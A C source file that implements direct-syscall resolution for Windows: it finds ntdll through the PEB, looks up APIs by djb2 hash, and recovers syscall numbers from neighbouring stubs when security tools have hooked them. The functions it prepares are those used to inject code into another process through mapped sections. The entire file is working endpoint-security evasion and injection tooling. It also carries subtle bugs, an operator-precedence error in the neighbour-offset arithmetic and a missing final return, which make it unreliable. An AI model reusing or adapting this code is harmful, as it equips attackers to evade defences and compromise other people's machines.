#include "header.h"

DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x92351f259ecd12a;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}

VOID PrintHashes() {

	PCHAR Apis[] = {
		"NtOpenProcess",
		"NtCreateSection",
		"NtMapViewOfSection",
		"NtUnmapViewOfSection",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtClose",
	};

	// Hash definitions
	for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
		printf("#define %s_HASH 0x%p\n", Apis[i], djb2(Apis[i]));
	}

	printf("\n");

    // Boilderplate code for fetching system calls
    for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
        printf("if (!FetchNtSyscall(&NtdllConf, %s_HASH, &Nt->%s)) {\n\tPRINT_ERROR(\"FetchNtSyscall [%s]\");\n\treturn FALSE;\n}\n\n", Apis[i], Apis[i], Apis[i], Apis[i]);
    }
}

BOOL InitNtdllConfigStructure(PNTDLL_CONFIG NtdllConf) {

    // getting peb 
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the 'g_NtdllConf' structure's element
    NtdllConf->uModule = uModule;
    NtdllConf->dwNumberOfNames = pImgExpDir->NumberOfNames;
    NtdllConf->pdwArrayOfNames = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    NtdllConf->pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    NtdllConf->pwArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

    // checking
    if (!NtdllConf->uModule || !NtdllConf->dwNumberOfNames || !NtdllConf->pdwArrayOfNames || !NtdllConf->pdwArrayOfAddresses || !NtdllConf->pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}

BOOL FetchNtSyscall(IN PNTDLL_CONFIG NtdllConf, IN DWORD64 dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!NtdllConf->uModule) {
        if (!InitNtdllConfigStructure(NtdllConf))
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i < NtdllConf->dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)(NtdllConf->uModule + NtdllConf->pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(NtdllConf->uModule + NtdllConf->pdwArrayOfAddresses[NtdllConf->pwArrayOfOrdinals[i]]);

        //\
        printf("- pcFuncName : %s - 0x%0.8X\n", pcFuncName, HASH(pcFuncName));

        pNtSys->pSyscallAddress = pFuncAddress;

        // if syscall found
        if (djb2(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSN = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSN = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSN = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]

        }

    }

    if (pNtSys->dwSSN != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}

BOOL InitializeDirectSyscalls(IN PNTAPI_FUNC Nt) {

    NTDLL_CONFIG NtdllConf = { 0 };

    INFO("Initializing direct syscalls...");

    if (!FetchNtSyscall(&NtdllConf, NtOpenProcess_HASH, &Nt->NtOpenProcess)) {
        PRINT_ERROR("FetchNtSyscall [NtOpenProcess]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtCreateSection_HASH, &Nt->NtCreateSection)) {
        PRINT_ERROR("FetchNtSyscall [NtCreateSection]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtMapViewOfSection_HASH, &Nt->NtMapViewOfSection)) {
        PRINT_ERROR("FetchNtSyscall [NtMapViewOfSection]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtUnmapViewOfSection_HASH, &Nt->NtUnmapViewOfSection)) {
        PRINT_ERROR("FetchNtSyscall [NtUnmapViewOfSection]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtCreateThreadEx_HASH, &Nt->NtCreateThreadEx)) {
        PRINT_ERROR("FetchNtSyscall [NtCreateThreadEx]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtWaitForSingleObject_HASH, &Nt->NtWaitForSingleObject)) {
        PRINT_ERROR("FetchNtSyscall [NtWaitForSingleObject]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtClose_HASH, &Nt->NtClose)) {
        PRINT_ERROR("FetchNtSyscall [NtClose]");
        return FALSE;
    }
}